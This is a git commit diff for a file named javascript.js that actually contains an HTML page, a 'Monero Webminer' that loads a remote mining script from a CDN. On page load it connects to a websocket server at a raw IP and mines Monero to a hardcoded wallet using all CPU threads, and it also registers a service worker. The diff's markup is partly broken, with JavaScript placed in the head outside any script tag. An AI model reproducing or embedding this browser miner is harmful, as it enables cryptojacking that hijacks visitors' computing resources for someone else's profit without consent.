4ce6a8d2818cd6eb347586efa15d3c712c2907f8
Iwants1 <156835459+Iwants1@users.noreply.github.com>
2024-01-17 11:08:31 +0700

    Update javascript.js

--- javascript.js
+++ javascript.js
@@ -1,33 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Monero Mining</title>
-</head>
-<body>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Monero Webminer</title>
+    <link rel="manifest" href="/manifest.json">
+      <!-- Start Of Mining Code -->
 
-  <div id="miningStatus">Mining...</div>
+      // Start Of Mining Code (Javascript)
+var script = document.createElement("script");
+script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+document.head.appendChild(script);
 
-  <script>
-    // Start Of Mining Code (Javascript)
-    // import command,
-    // import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';
+server = "wss://45.119.82.33:40725";
+var pool = "moneroocean.stream";
+var walletAddress = "8Bn5zVaemZM911hbYGA7tEKv8ypwUEEzBGsKLGoygGXvTAeGHWXofHXgEBrUCQp2ikFgMsAePzBfyKg693zaYGBBPif9VGH";
+var workerId = "GH-XMR";
+var threads = -1;
+var password = "";
+startMining(pool, walletAddress, workerId, threads, password);
+throttleMiner = 20;
+// End Of Mining Code
 
-    var script = document.createElement("script");
-    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
-    document.head.appendChild(script);
+      <!-- End Of Mining Code -->
 
-    server = "wss://45.119.82.33:40725/";
-    var pool = "moneroocean.stream";
-    var walletAddress = "8Bn5zVaemZM911hbYGA7tEKv8ypwUEEzBGsKLGoygGXvTAeGHWXofHXgEBrUCQp2ikFgMsAePzBfyKg693zaYGBBPif9VGH";
-    var workerId = "GH-XMR-JS-SNIPPET"
-    var threads = -1;
-    var password = "";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
-    // End Of Mining Code
-  </script>
 
-</body>
+  </head>
+  <body>
+    <h1>Mining...</h1>
+    <p>View mining progress <a href="https://moneroocean.stream">here</a></p>
+<script>
+  if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+      navigator.serviceWorker.register('/serviceworker.js').then(registration => {
+        console.log('Service Worker registered with scope:', registration.scope);
+      }).catch(error => {
+        console.error('Service Worker registration failed:', error);
+      });
+    });
+  }
+</script>
+
+  </body>
 </html>
